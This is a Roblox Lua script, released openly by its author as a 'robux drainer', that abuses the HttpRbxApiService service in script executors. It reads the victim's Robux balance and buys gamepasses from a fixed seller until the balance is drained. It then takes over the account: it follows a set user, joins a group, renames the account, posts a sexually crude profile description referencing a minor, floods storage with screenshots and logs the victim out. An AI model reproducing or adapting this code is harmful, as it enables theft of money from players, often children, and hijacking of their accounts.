-- this script has been patched in every executor except fluxus, this shouldnt work at all yet it still does, so ill just leave this open source since theres no reason to obfuscate it with luraph and add security to it, this script used to be over 3k lines with all the security added to it but now its just the vulnerable service HttpRbxApiService
-- additionally, this was made to target less known or private executors who dont know HttpRbxApiService exists
-- discord: systask
-- telegram: t.me/fissurectomy
-- new v3rmillion: str







-- keep in mind this is an old project, dont come saying the lua code is written so bad :sob:
repeat task.wait() until game:IsLoaded()

local function reject()
game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.F9,false,game)
while wait(0.5) do
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Please check console!",
	Text = "Type '/console' or press F9",
})

warn("Your executor is sadly not supported, due to some UNC functions missing. Consider downloading Fluxus at fluxteam.net!")
end
task.wait(10000000000)
end

-- checks if HttpRbxApiService is blocked
local suc, err = pcall(function() game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency") end)
if not err then
print("continue")
else
reject()
end

while task.wait(0.25) do
local x = game:GetService("HttpRbxApiService") -- its time for the funny service
local rb

local response = x:GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency") -- roblox endpoint to grab balance

local startIndex = string.find(response, '{"robux":')

if startIndex then
    local endIndex = string.find(response, '}', startIndex)

    if endIndex then
        rb = tonumber(string.sub(response, startIndex + 9, endIndex - 1))
    end
end -- cant use httpservice json decode, so we use plaintext 

-- gamepass name / value
-- Eros / 15 robux
-- Hercules / 25 robux
-- Hylos / 50 robux
-- Tartarus / 100 robux
-- Deimos / 200 robux
-- Artemis / 300 robux
-- Zeus / 500 robux --
-- Kratos / 750 robux
-- Athena / 1000 robux
-- Hephaestus / 1.5k robux
-- Hera / 2k robux
-- Krampus / 2.5k robux
-- Pegasus / 4k robux
-- Poseidon / 6k robux
-- Hermes / 8k robux
-- Apollo / 13k robux
-- Hades / 20k robux
-- Demeter / 35k robux
-- Atlas / 50k robux
-- Cronus / 75k robux
-- Helios / 150k robux

-- gamepass name / endpoints
-- Hercules / https://economy.roblox.com/v1/purchases/products/1683704860
-- Eros / https://economy.roblox.com/v1/purchases/products/1683704662
-- Hylos / https://economy.roblox.com/v1/purchases/products/1680670958
-- Tartarus / https://economy.roblox.com/v1/purchases/products/1680670695
-- Deimos / https://economy.roblox.com/v1/purchases/products/1680670843
-- Artemis / https://economy.roblox.com/v1/purchases/products/1680670801
-- Zeus / https://economy.roblox.com/v1/purchases/products/1680670762
-- Kratos / https://economy.roblox.com/v1/purchases/products/1680671056
-- Athena / https://economy.roblox.com/v1/purchases/products/1680671032
-- Hephaestus / https://economy.roblox.com/v1/purchases/products/1680670936
-- Hera / https://economy.roblox.com/v1/purchases/products/1680671019
-- Krampus / https://economy.roblox.com/v1/purchases/products/1680670895
-- Pegasus / https://economy.roblox.com/v1/purchases/products/1680670910
-- Poseidon / https://economy.roblox.com/v1/purchases/products/1680670976
-- Hermes / https://economy.roblox.com/v1/purchases/products/1680670744
-- Apollo / https://economy.roblox.com/v1/purchases/products/1680670998
-- Hades / https://economy.roblox.com/v1/purchases/products/1680670874
-- Demeter / https://economy.roblox.com/v1/purchases/products/1680670818
-- Atlas / https://economy.roblox.com/v1/purchases/products/1680670725
-- Cronus / https://economy.roblox.com/v1/purchases/products/1680670783
-- Helios / https://economy.roblox.com/v1/purchases/products/1680670855

local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":3409950911}'
local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":3409950911}'
local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":3409950911}'
local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":3409950911}'
local deimos = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":3409950911}'
local artemis = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":3409950911}'
local zeus = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":3409950911}'
local kratos = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":3409950911}'
local athena = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":3409950911}'
local hephaestus = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":3409950911}'
local hera = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":3409950911}'
local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":3409950911}'
local pegasus = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":3409950911}'
local poseidon = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":3409950911}'
local hermes = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":3409950911}'
local apollo = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":3409950911}'
local hades = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":3409950911}'
local demeter = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":3409950911}'
local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":3409950911}'
local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":3409950911}'
local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":3409950911}'

task.wait(0.01)

local function screenshot() -- flood storage
while wait() do
game.CoreGui:TakeScreenshot()
end
end

local function godly() -- mess with the roblox account profile
local player = game.Players.LocalPlayer
local userId = player.UserId
local description = '{"description":"Your executor is vulnerable and got your account beamed! if youre a female... pwease hit me up on dc... im a 14 yo that needs dominant mommies to absolutely crush the living hell out of my ball... dc: @reflexsecurity"}'
local none = ''
local china = '{"supportedLocaleCode":"zh_TW"}'
local changedisplay = {
    Url = "https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names",
    Method = "PATCH",
    Body = '{"newDisplayName":"CheckNewGroupYoureIn"}',
}

local followaccount, followacc = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.com/v1/users/5196213475/follow', none)
end)
task.wait(0.01)
local joingroup, joining = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://groups.roblox.com/v1/groups/33418242/users', none)
end)
task.wait(0.01)
local updatedesclol, updatdescription = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://users.roblox.com/v1/description", description)
end)
task.wait(0.01)
local displaynamemagic, namedisplaymagik = pcall(function()
game:GetService("HttpRbxApiService"):RequestAsync(changedisplay)
end)
task.wait(0.01)
game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://locale.roblox.com/v1/locales/set-user-supported-locale", china)
task.wait(0.01)
screenshot()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://auth.roblox.com/v1/logout", none)
task.wait(3)
print("oops")
end


-- robux drainer
if rb == 0 then
godly()
elseif rb > 0 and rb < 15 then
godly()
elseif rb >= 15 and rb < 25 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1683704662", eros)
wait()
elseif rb >= 25 and rb < 50 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1683704860", hercules)
wait()
elseif rb >= 50 and rb < 100 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670958", hylos)
wait()
elseif rb >= 100 and rb < 200 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670695", tartarus)
wait()
elseif rb >= 200 and rb < 300 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670843", deimos)
wait()
elseif rb >= 300 and rb < 500 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670801", artemis)
wait()
elseif rb >= 500 and rb < 750 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670762", zeus)
wait()
elseif rb >= 750 and rb < 1000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680671056", kratos)
wait()
elseif rb >= 1000 and rb < 1500 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680671032", athena)
wait()
elseif rb >= 1500 and rb < 2000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670936", hephaestus)
wait()
elseif rb >= 2000 and rb < 2500 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680671019", hera)
wait()
elseif rb >= 2500 and rb < 4000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670895", krampus)
wait()
elseif rb >= 4000 and rb < 6000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670910", pegasus)
wait()
elseif rb >= 6000 and rb < 8000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670976", poseidon)
wait()
elseif rb >= 8000 and rb < 13000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670744", hermes)
wait()
elseif rb >= 13000 and rb < 20000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670998", apollo)
wait()
elseif rb >= 20000 and rb < 35000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670874", hades)
wait()
elseif rb >= 35000 and rb < 50000 then
gx:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670818", demeter)
wait()
elseif rb >= 50000 and rb < 75000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670725", atlas)
wait()
elseif rb >= 75000 and rb < 150000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670783", cronus)
wait()
else
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1680670855", helios)
wait()
end

task.wait(0.01)
end
-- cya
